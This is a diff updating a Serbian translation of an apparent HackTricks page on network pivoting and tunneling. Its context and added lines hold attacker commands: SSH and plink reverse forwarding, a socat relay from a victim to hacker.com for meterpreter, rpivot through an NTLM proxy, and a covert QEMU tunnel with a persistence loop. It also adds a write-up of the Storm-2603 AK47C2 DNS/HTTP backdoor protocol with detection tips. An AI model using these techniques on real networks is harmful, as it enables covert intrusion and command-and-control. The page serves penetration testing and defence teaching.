@@ -55,9 +55,9 @@ Lokalni port --> Kompromitovani host (SSH) --> Gde god
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### Reverse Port Forwarding
+### Обратно прослеђивање порта
 
-Ovo je korisno za dobijanje obrnute ljuske sa internih hostova kroz DMZ do vašeg hosta:
+Ово је корисно за добијање обрнутог шелла са интерних хостова преко DMZ-а до вашег хоста:
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -156,14 +156,14 @@ rportfwd stop [bind port]
 ```
 Da se napomene:
 
-- Beaconov obrnuti port forwarding je dizajniran da **tuneluje saobraćaj ka Team Server-u, a ne za preusmeravanje između pojedinačnih mašina**.
+- Beaconov obrnuti port forwarding je dizajniran da **tuneluje saobraćaj ka Team Serveru, a ne za preusmeravanje između pojedinačnih mašina**.
 - Saobraćaj je **tunelovan unutar Beaconovog C2 saobraćaja**, uključujući P2P linkove.
-- **Administratorske privilegije nisu potrebne** za kreiranje obrnuti port forward-a na visokim portovima.
+- **Administratorske privilegije nisu potrebne** za kreiranje obrnuti port forwardinga na visokim portovima.
 
 ### rPort2Port lokalno
 
 > [!WARNING]
-> U ovom slučaju, **port je otvoren na beacon host-u**, a ne na Team Server-u i **saobraćaj se šalje Cobalt Strike klijentu** (ne na Team Server) i odatle na navedeni host:port
+> U ovom slučaju, **port je otvoren na beacon hostu**, a ne na Team Serveru i **saobraćaj se šalje Cobalt Strike klijentu** (ne na Team Server) i odatle na navedeni host:port
 ```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivotiranje kroz **NTLM proxy**
+Pivot kroz **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -280,7 +280,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter kroz SSL Socat
+### Meterpreter preko SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Možete zaobići **neautentifikovani proxy** izvršavanjem ove linije umesto poslednje u konzoli žrtve:
+Možete zaobići **neautentifikovani proxy** izvršavajući ovu liniju umesto poslednje u konzoli žrtve:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 To je kao konzolna verzija PuTTY (opcije su vrlo slične ssh klijentu).
 
-Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo mogli da imamo obrnutu vezu. Zatim, da bismo prosledili samo lokalno dostupni port na port na našoj mašini:
+Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo imali obrnutu vezu. Zatim, da bismo preusmerili samo lokalno dostupni port na port na našoj mašini:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -347,7 +347,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Morate imati **RDP pristup preko sistema**.\
+Potrebno je imati **RDP pristup preko sistema**.\
 Preuzmite:
 
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) iz funkcije Remote Desktop Service u Windows-u. DVC je odgovoran za **tunelovanje paketa preko RDP veze**.
@@ -364,7 +364,7 @@ Sada možemo **connect** na **victim** preko **RDP** koristeći **`mstsc.exe`**,
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Sada, potvrdite na vašem računaru (napadaču) da port 1080 sluša:
+Sada potvrdite na vašem računaru (napadaču) da port 1080 sluša:
 ```
 netstat -antb | findstr 1080
 ```
@@ -396,7 +396,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sada, ako na primer postavite **SSH** servis na žrtvi da sluša na portu 443. Možete se povezati na njega kroz port 2222 napadača.\
+Sada, ako na primer postavite **SSH** servis na žrtvi da sluša na portu 443. Možete se povezati na njega kroz port napadača 2222.\
 Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443, a napadač sluša na portu 2222.
 
 ## YARP
@@ -452,6 +452,40 @@ Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz 
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
+### Prilagođeni DNS TXT / HTTP JSON C2 (AK47C2)
+
+Storm-2603 akter je stvorio **dual-channel C2 ("AK47C2")** koji zloupotrebljava *samo* izlazni **DNS** i **plain HTTP POST** saobraćaj – dva protokola koja su retko blokirana na korporativnim mrežama.
+
+1. **DNS režim (AK47DNS)**
+• Generiše nasumični 5-znamenkasti SessionID (npr. `H4T14`).
+• Dodaje `1` za *zahteve za zadatke* ili `2` za *rezultate* i spaja različita polja (flagovi, SessionID, ime računara).
+• Svako polje je **XOR-enkriptovano sa ASCII ključem `VHBD@H`**, heksadecimalno kodirano, i spojeno tačkama – na kraju završava sa domenom pod kontrolom napadača:
+
+```text
+<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
+```
+
+• Zahtevi koriste `DnsQuery()` za **TXT** (i rezervne **MG**) zapise.
+• Kada odgovor premaši 0xFF bajtova, backdoor **fragmentira** podatke u delove od 63 bajta i umetne oznake:
+`s<SessionID>t<TOTAL>p<POS>` tako da C2 server može da ih ponovo poređa.
+
+2. **HTTP režim (AK47HTTP)**
+• Gradi JSON omot:
+```json
+{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
+```
+• Ceo blob je XOR-`VHBD@H` → heks → poslat kao telo **`POST /`** sa zaglavljem `Content-Type: text/plain`.
+• Odgovor prati isto kodiranje i `cmd` polje se izvršava sa `cmd.exe /c <command> 2>&1`.
+
+Napomene plavog tima
+• Tražite neobične **TXT upite** čija je prva oznaka duga heksadecimalna i uvek se završava u jednom retkom domenu.
+• Konstantan XOR ključ praćen ASCII-heks je lako detektovati sa YARA: `6?56484244?484` (`VHBD@H` u heks).
+• Za HTTP, označite text/plain POST tela koja su čista heks i višekratnik od dva bajta.
+
+{{#note}}
+Celi kanal staje unutar **standardnih RFC-usaglašenih upita** i drži svaku poddomen oznaku ispod 63 bajta, čineći ga neprimetnim u većini DNS logova.
+{{#endnote}}
+
 ## ICMP Tunneling
 
 ### Hans
@@ -484,7 +518,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **je alat za izlaganje rešenja internetu u jednoj komandnoj liniji.**\
-_Exposition URI su kao:_ **UID.ngrok.io**
+_URI za izlaganje su kao:_ **UID.ngrok.io**
 
 ### Instalacija
 
@@ -574,7 +608,7 @@ Pokrenite konektor:
 ```bash
 cloudflared tunnel run mytunnel
 ```
-Zato što sav saobraćaj napušta host **izlazno preko 443**, Cloudflared tuneli su jednostavan način da se zaobiđu ulazni ACL-ovi ili NAT granice. Budite svesni da se binarni fajl obično pokreće sa povišenim privilegijama – koristite kontejnere ili `--user` flag kada je to moguće.
+Zbog toga što sav saobraćaj napušta host **izlazno preko 443**, Cloudflared tuneli su jednostavan način da se zaobiđu ulazni ACL-ovi ili NAT granice. Budite svesni da se binarni fajl obično pokreće sa povišenim privilegijama – koristite kontejnere ili `--user` flag kada je to moguće.
 
 ## FRP (Fast Reverse Proxy)
 
@@ -608,7 +642,7 @@ sshTunnelGateway.bindPort = 2200   # add to frps.toml
 # On victim (OpenSSH client only)
 ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
 ```
-Gore navedena komanda objavljuje port žrtve **8080** kao **attacker_ip:9000** bez implementacije dodatnih alata – idealno za pivotiranje koje koristi resurse na terenu.
+Gore navedena komanda objavljuje port žrtve **8080** kao **attacker_ip:9000** bez implementacije dodatnih alata – idealno za pivotiranje koristeći resurse na terenu.
 
 ## Tajni VM-bazirani tuneli sa QEMU
 
@@ -626,7 +660,7 @@ qemu-system-x86_64.exe ^
 ```
 • Komanda iznad pokreće **Tiny Core Linux** sliku (`tc.qcow2`) u RAM-u.  
 • Port **2222/tcp** na Windows hostu se transparentno prosleđuje na **22/tcp** unutar gosta.  
-• Sa stanovišta napadača, meta jednostavno izlaže port 2222; svi paketi koji do njega stignu se obrađuju od strane SSH servera koji radi u VM-u.  
+• Sa stanovišta napadača, cilj jednostavno izlaže port 2222; svi paketi koji do njega stignu se obrađuju od strane SSH servera koji radi u VM-u.  
 
 ### Pokretanje neprimetno kroz VBScript
 ```vb
@@ -638,7 +672,7 @@ Pokretanje skripte sa `cscript.exe //B update.vbs` drži prozor skrivenim.
 
 ### U gostu postojanost
 
-Pošto je Tiny Core bezdržavni, napadači obično:
+Budući da je Tiny Core bezdržavni, napadači obično:
 
 1. Postavljaju payload na `/opt/123.out`
 2. Dodaju u `/opt/bootlocal.sh`:
@@ -653,14 +687,14 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ### Zašto ovo izbegava detekciju
 
 • Samo dva nesigurna izvršna fajla (`qemu-system-*.exe`) dodiruju disk; nijedni drajveri ili servisi nisu instalirani.
-• Bezbednosni proizvodi na hostu vide **benigni loopback saobraćaj** (stvarni C2 se završava unutar VM-a).
-• Skeneri memorije nikada ne analiziraju prostor malicioznog procesa jer se nalazi u drugom OS-u.
+• Bezbednosni proizvodi na hostu vide **benigni loopback saobraćaj** (stvarni C2 se završava unutar VM).
+• Skeneri memorije nikada ne analiziraju prostor zlonamernog procesa jer živi u drugom OS-u.
 
 ### Saveti za Defender
 
 • Upozorite na **neočekivane QEMU/VirtualBox/KVM binarne fajlove** u putanjama koje korisnik može pisati.
 • Blokirajte izlazne konekcije koje potiču od `qemu-system*.exe`.
-• Tražite retke portove koji slušaju (2222, 10022, …) koji se vezuju odmah nakon pokretanja QEMU-a.
+• Tražite retke portove koji slušaju (2222, 10022, …) koji se vezuju odmah nakon pokretanja QEMU.
 
 ---
 
@@ -672,5 +706,6 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 ## Reference
 
 - [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
+- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 
 {{#include ../banners/hacktricks-training.md}}
